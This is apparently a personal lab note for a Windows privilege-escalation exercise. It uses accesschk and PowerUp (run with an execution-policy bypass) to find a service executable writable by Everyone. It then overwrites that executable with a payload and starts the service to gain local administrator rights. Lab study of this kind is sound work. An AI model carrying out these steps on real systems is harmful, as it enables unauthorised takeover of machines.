#Windows #PrivEsc #ExecutableFiles #PowerUp #SimpleHTTPServer #sc 

## **Detection**

Windows VM

1. Open command prompt and type: `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"`
2. Notice that the “Everyone” user group has “`FILE_ALL_ACCESS`” permission on the `filepermservice.exe` file.
- Also make sure to run `PowerUp.ps1` from folder where PowerUp is installed
```
powershell -ep bypass

. .\PowerUp.ps1

Invoke-AllChecks
```

## **Exploitation**

Windows VM

1. Open command prompt and type: `copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"`  
	1. `x.exe` is from [[13_PrivEsc-Registry(regsvc)]], ensure it is done before this step
2. In command prompt type: `sc start filepermsvc`  
3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: `net localgroup administrators`